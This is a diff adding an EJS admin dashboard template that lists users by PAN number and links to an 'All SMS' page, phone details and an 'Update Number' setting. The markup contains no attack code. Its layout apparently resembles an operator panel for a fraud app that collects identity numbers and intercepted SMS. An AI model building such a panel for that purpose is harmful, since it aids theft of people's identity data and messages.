@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Admin Dashboard</title>
+  <style>
+    /* Global Styles */
+    * {
+      box-sizing: border-box;
+    }
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #f4f4f4;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+    header {
+      background-color: #333;
+      color: #fff;
+      padding: 15px;
+      text-align: center;
+    }
+    /* Header Navigation Styles */
+    .header-nav {
+      margin-top: 10px;
+      display: flex;
+      justify-content: center;
+      flex-wrap: wrap;
+      gap: 10px;
+    }
+    .header-nav a {
+      color: #fff;
+      text-decoration: none;
+      font-size: 16px;
+      background-color: #444;
+      padding: 10px 20px;
+      border-radius: 5px;
+      transition: background-color 0.3s;
+    }
+    .header-nav a:hover {
+      background-color: #555;
+    }
+    /* Button Container (Start/Stop) */
+    .button-container {
+      text-align: center;
+      margin: 20px 0;
+    }
+    .start-button,
+    .stop-button {
+      padding: 10px 20px;
+      border: none;
+      cursor: pointer;
+      font-size: 16px;
+      margin: 5px;
+      border-radius: 5px;
+    }
+    .start-button {
+      background-color: #28a745;
+      color: #fff;
+    }
+    .stop-button {
+      background-color: #dc3545;
+      color: #fff;
+    }
+    /* Main Content */
+    main {
+      flex: 1;
+      width: 90%;
+      max-width: 1200px;
+      margin: 20px auto;
+      background-color: #fff;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+    }
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      margin-top: 20px;
+    }
+    th,
+    td {
+      padding: 12px;
+      text-align: center;
+      border-bottom: 1px solid #ddd;
+    }
+    th {
+      background-color: #333;
+      color: #fff;
+    }
+    tr.clickable-row {
+      cursor: pointer;
+    }
+    tr.clickable-row:hover {
+      background-color: #f2f2f2;
+    }
+    .delete-button {
+      background-color: #d9534f;
+      color: #fff;
+      border: none;
+      padding: 8px 12px;
+      cursor: pointer;
+      border-radius: 5px;
+    }
+    .delete-button:hover {
+      background-color: #c9302c;
+    }
+    /* Avatar Style */
+    .avatar {
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+    }
+    /* Responsive Styles */
+    @media (max-width: 600px) {
+      .start-button,
+      .stop-button {
+        width: 90%;
+        margin: 10px auto;
+        display: block;
+      }
+      th,
+      td {
+        padding: 8px;
+      }
+      .header-nav a {
+        font-size: 14px;
+        padding: 8px 10px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <h1>Admin Dashboard</h1>
+    <!-- Combined Header Navigation -->
+    <nav class="header-nav">
+      <a href="/settings">Update Number</a>
+      <a href="/api/device/admin/phone">View Phone Details</a>
+      <a href="/sms">All SMS</a>
+      <a href="/change-password">Change Password</a>
+    </nav>
+  </header>
+
+  <!-- Start/Stop Buttons -->
+  
+  
+    <!-- Optionally add a Stop button if needed -->
+    <!--
+    <form action="/api/call/stop" method="GET" style="display: inline-block;">
+      <button type="submit" class="stop-button">Stop</button>
+    </form>
+    -->
+ 
+
+  <!-- Main Content Area -->
+  <main>
+    <section id="user-data">
+      <h2>User Data</h2>
+      <table>
+        <thead>
+          <tr>
+            <th>Avatar</th>
+            <th>PAN</th>
+            <th>Details</th>
+            <th>Actions</th>
+          </tr>
+        </thead>
+        <tbody>
+          <% users.forEach(function(user) { %>
+            <tr class="clickable-row" data-href="/detail/<%= user._id %>">
+              <td>
+                <img src="/public/images/avatar.png" alt="avatar" class="avatar">
+              </td>
+              
+              
+              
+              
+              <td><%= user.pan %></td>
+              <td>
+                <a href="/detail/<%= user._id %>" style="text-decoration: none; color: #007bff;">View Details</a>
+              </td>
+              <td>
+                <form action="/delete/<%= user._id %>" method="POST" style="display:inline;" onsubmit="return confirm('Are you sure you want to delete this user?');">
+                  <button type="submit" class="delete-button">Delete</button>
+                </form>
+              </td>
+            </tr>
+          <% }); %>
+        </tbody>
+      </table>
+    </section>
+  </main>
+
+  <script>
+    document.addEventListener('DOMContentLoaded', function () {
+      // Make table rows clickable, but avoid triggering on inner links/buttons
+      document.querySelectorAll('.clickable-row').forEach(function (row) {
+        row.addEventListener('click', function (e) {
+          if (
+            e.target.tagName.toLowerCase() !== 'a' &&
+            e.target.tagName.toLowerCase() !== 'button'
+          ) {
+            window.location.href = this.dataset.href;
+          }
+        });
+      });
+    });
+  </script>
+</body>
+</html>
